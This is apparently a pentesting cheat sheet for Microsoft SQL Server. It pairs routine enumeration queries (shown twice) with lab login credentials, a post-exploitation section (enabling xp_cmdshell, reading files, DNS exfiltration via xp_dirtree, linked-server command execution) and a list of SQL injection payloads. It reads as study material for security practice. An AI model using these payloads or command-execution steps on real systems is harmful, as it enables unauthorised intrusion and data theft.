# 1337Codes SQL Server Cheat Sheet

impacket-mssqlclient Administrator:Lab123@192.168.148.18 -windows-auth

SQL Server Instance  
├── Databases  
│ ├── Tables  
│ │ ├── Columns  
│ │ ├── Indexes  
│ │ └── Constraints  
│ ├── Views  
│ ├── Stored Procedures  
│ ├── Functions  
│ ├── Schemas  
│ └── Security (Users, Roles, Permissions)  
├── System Views  
├── Linked Servers  
└── Agent Jobs

| **Task** | **SQL Command / View** | **Description** |
| --- | --- | --- |
| List all databases | `SELECT * FROM sys.databases;` | Lists all databases on the SQL Server instance |
| List all tables in current database | `SELECT * FROM sys.tables;` | Shows user-defined tables |
| List all users in current database | `SELECT * FROM sys.database_principals;` | Shows all users, roles, certificates, etc. |
| List all server-level logins | `SELECT * FROM sys.server_principals;` | Shows logins that can access the SQL Server instance |
| Current user | `SELECT SUSER_NAME();` or `SELECT USER_NAME();` | Shows the current login or DB user |
| List all schemas | `SELECT * FROM sys.schemas;` | Shows all schemas in the current database |
| Find permissions for a user | `SELECT * FROM fn_my_permissions(NULL, 'DATABASE');` | Lists effective permissions for the current user |
| List all roles in current database | `SELECT * FROM sys.database_role_members;` | Shows role memberships |
| Find which roles a user belongs to | Join `sys.database_principals` + `sys.database_role_members` | Map users to roles |
| List all stored procedures | `SELECT * FROM sys.procedures;` | Shows all stored procs in the current database |
| List columns in a table | `SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'YourTableName';` | Shows all columns for a specific table |
| Check database size | `sp_spaceused` (run inside DB) | Shows size and space info of the database |
| View active sessions | `SELECT * FROM sys.dm_exec_sessions;` | Shows current sessions (useful for monitoring) |
| View running queries | `SELECT * FROM sys.dm_exec_requests;` | Shows running requests/queries |
| Get SQL text of a running query | Join with `sys.dm_exec_sql_text(sql_handle)` | See full SQL query from request handle |
| See object dependencies | `SELECT * FROM sys.sql_expression_dependencies;` | Shows dependencies between objects |
| View indexes | `SELECT * FROM sys.indexes;` | Shows indexes on all tables |
| List triggers | `SELECT * FROM sys.triggers;` | View all DML and DDL triggers |

## 🔧 SQL Server Cheat Sheet – Common System Views & Queries

```
impacket-mssqlclient Administrator:Lab123@192.168.148.18 -windows-auth
```

**SQL Server Instance Structure**

```
SQL Server Instance  
├── Databases  
│   ├── Tables  
│   │   ├── Columns  
│   │   ├── Indexes  
│   │   └── Constraints  
│   ├── Views  
│   ├── Stored Procedures  
│   ├── Functions  
│   ├── Schemas  
│   └── Security (Users, Roles, Permissions)  
├── System Views  
├── Linked Servers  
└── Agent Jobs
```



## ✨ Additional Enumeration & Tips

| **Task** | **SQL Command / View** | **Description** |
| --- | --- | --- |
| List all databases | `SELECT * FROM sys.databases;` | Lists all databases on the SQL Server instance |
| List all tables in current database | `SELECT * FROM sys.tables;` | Shows user-defined tables |
| List all users in current database | `SELECT * FROM sys.database_principals;` | Shows all users, roles, certificates, etc. |
| List all server-level logins | `SELECT * FROM sys.server_principals;` | Shows logins that can access the SQL Server instance |
| Current user | `SELECT SUSER_NAME();` or `SELECT USER_NAME();` | Shows the current login or DB user |
| List all schemas | `SELECT * FROM sys.schemas;` | Shows all schemas in the current database |
| Find permissions for a user | `SELECT * FROM fn_my_permissions(NULL, 'DATABASE');` | Lists effective permissions for the current user |
| List all roles in current database | `SELECT * FROM sys.database_role_members;` | Shows role memberships |
| Find which roles a user belongs to | Join `sys.database_principals` + `sys.database_role_members` | Map users to roles |
| List all stored procedures | `SELECT * FROM sys.procedures;` | Shows all stored procs in the current database |
| List columns in a table | `SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'YourTableName';` | Shows all columns for a specific table |
| Check database size | `sp_spaceused` (run inside DB) | Shows size and space info of the database |
| View active sessions | `SELECT * FROM sys.dm_exec_sessions;` | Shows current sessions (useful for monitoring) |
| View running queries | `SELECT * FROM sys.dm_exec_requests;` | Shows running requests/queries |
| Get SQL text of a running query | Join with `sys.dm_exec_sql_text(sql_handle)` | See full SQL query from request handle |
| See object dependencies | `SELECT * FROM sys.sql_expression_dependencies;` | Shows dependencies between objects |
| View indexes | `SELECT * FROM sys.indexes;` | Shows indexes on all tables |
| List triggers | `SELECT * FROM sys.triggers;` | View all DML and DDL triggers |



---

## 🧠 Tips & Tricks for SQL Server Enumeration

- 📊 Use `SELECT SYSTEM_USER, SUSER_NAME(), USER_NAME();` to determine current identity and privileges.
- 🛠️ Use `EXEC sp_helpdb;` or `sp_helpdb 'dbname';` for detailed database info including file paths.
- 🗂️ View open transactions: `DBCC OPENTRAN`.
- 💡 Check instance-level settings: `SELECT * FROM sys.configurations;`.
- 🔍 Check for linked servers: `SELECT * FROM sys.servers;` — useful in lateral movement.
- 🛡️ Use `SELECT * FROM fn_my_permissions(NULL, 'SERVER');` to enumerate server-level permissions.

---

## 🛡️ Post-Exploitation & Abuse

- 🏹 Check for `xp_cmdshell`: 
  ```sql
  EXEC sp_configure 'xp_cmdshell';
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  ```
- 📁 Read files: `OPENROWSET(BULK N'C:\boot.ini', SINGLE_CLOB) AS Contents`.
- 📡 Exfil via DNS or HTTP using `xp_dirtree`, `xp_fileexist`, or UDFs.
- 🔗 Linked Server RCE:
  ```sql
  EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSERVER];
  ```

---

## 🧪 More Useful Views

- `sys.sql_modules` — See full SQL source code for procedures, triggers, etc.
- `sys.dm_exec_connections` — IPs and connection info.
- `sys.dm_exec_query_stats` — Query performance info.
- `sys.dm_os_sys_info` — System information (memory, CPU, etc.)


---

## 🎯 SQL Injection: Useful Payloads and Techniques

### 🔍 Classic Payloads (Authentication Bypass)
```sql
' OR '1'='1 --
admin' -- 
admin' #
admin'/*
```

### 🧪 Error-Based Injection
```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
```

### 🕵️ Blind Boolean-Based
```sql
' AND 1=1 -- (True)
' AND 1=2 -- (False)
```

### ⏱️ Time-Based (Blind)
```sql
'; WAITFOR DELAY '00:00:05';--
' OR 1=1 WAITFOR DELAY '00:00:10';--
```

### 🌐 URL-Encoded Examples
```text
https://target.com/login?user=admin'--&pass=123
https://target.com/item?id=1+AND+1=1--
https://target.com/item?id=1'+AND+SLEEP(5)--+
```

---

## 🔍 SQL Server Injection Tips

- Use `CAST`, `CONVERT`, or string concatenation to extract information.
- Use delays to measure blind injection viability.
- If errors are suppressed, try encoding special characters in URL or using `CHAR()` function.

